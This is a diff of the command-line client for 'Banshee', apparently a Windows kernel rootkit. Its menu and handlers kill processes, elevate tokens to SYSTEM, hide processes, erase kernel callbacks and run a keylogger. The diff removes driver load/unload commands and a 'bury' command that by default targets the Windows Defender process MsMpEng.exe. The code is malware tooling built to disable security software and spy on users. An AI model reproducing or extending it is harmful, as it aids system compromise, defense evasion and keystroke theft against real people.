@@ -20,39 +20,10 @@ main(INT argc, CHAR *argv[])
 
     auto banshee = Banshee();
 
-    if (argc >= 2)
+    if (banshee.Initialize() != BE_SUCCESS)
     {
-        std::string driverPath = argv[1];
-        BANSHEE_STATUS BeStatus = banshee.Install(driverPath);
-
-        LogInfo("Installing driver if not already installed...");
-        if (BeStatus != BE_SUCCESS)
-        {
-            if (BeStatus == BE_ERR_DRIVER_NOT_EXISTS)
-            {
-                LogError("Driver does not exist at path " + driverPath + " ");
-            }
-            else
-            {
-                LogError("Error during install");
-            }
-            return 1;
-        }
-        LogInfo("Loading driver...");
-        if (banshee.Initialize() != BE_SUCCESS)
-        {
-            LogError("Error during initialization");
-            return 2;
-        }
-    }
-    else
-    {
-        LogInfo("Driver location not specified. Assuming driver is loaded already...");
-        if (!banshee.InitDriverHandle())
-        {
-            LogError("Error during initialization: Could not get handle");
-            return 3;
-        }
+        LogError("Error during initialization: Could not get handle");
+        return 3;
     }
     
     // Main Loop
@@ -70,7 +41,6 @@ main(INT argc, CHAR *argv[])
         {
             printf("Kill:\n");
             printf("    kill      - kill process by PID\n");
-            printf("    bury      - Create callback to kill process when it comes back up. Defaults to MsMpEng.exe\n");
             printf("Process:\n");
             printf("    elevate   - Change a process access token to SYSTEM by PID\n");
             printf("    hide      - Hide a process from task manager etc. by PID\n");
@@ -79,13 +49,11 @@ main(INT argc, CHAR *argv[])
             printf("Callbacks:\n");
             printf("    callbacks - enumerate kernel callbacks\n");
             printf("    erase     - erase kernel callbacks of any driver\n");
-            printf("Driver:\n");
-            printf("    test      - test driver\n");
-            printf("    load      - load driver from path\n");
-            printf("    unload    - unload driver\n");
-            printf("Misc:\n");
+            printf("Keylogging:\n");
             printf("    keylog         - start keylogger\n");
             printf("    stop_keylog    - stop keylogger\n");
+            printf("Misc:\n");
+            printf("    test      - test driver\n");
             printf("\n");
             printf("    exit      - exit banshee\n");
             continue;
@@ -99,34 +67,10 @@ main(INT argc, CHAR *argv[])
         {
             status = banshee.IoCtlTestDriver();
         }
-        else if (choice == "load")
-        {
-            auto pathToDriver = AskInputNoPrompt("Path to driver: ");
-            status = banshee.Install(pathToDriver);
-            if (status == BE_SUCCESS)
-            {
-                status = banshee.Initialize();
-            }
-        }
-        else if (choice == "unload")
-        {
-            status = banshee.Unload();
-        }
         else if (choice == "kill")
         {
             INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlKillProcess(targetPid);
-        }
-        else if (choice == "bury")
-        {
-            auto processToBury = AskInputNoPrompt("Target process (substring to match image path, spaces will be stripped): ");
-
-            // strip spaces
-            auto end_pos = std::remove(processToBury.begin(), processToBury.end(), ' '); 
-            processToBury.erase(end_pos, processToBury.end());
-
-            LogInfo("Attempting to bury " + processToBury);
-            status = banshee.IoCtlBuryProcess(processToBury);
         }
         else if (choice == "elevate")
         {
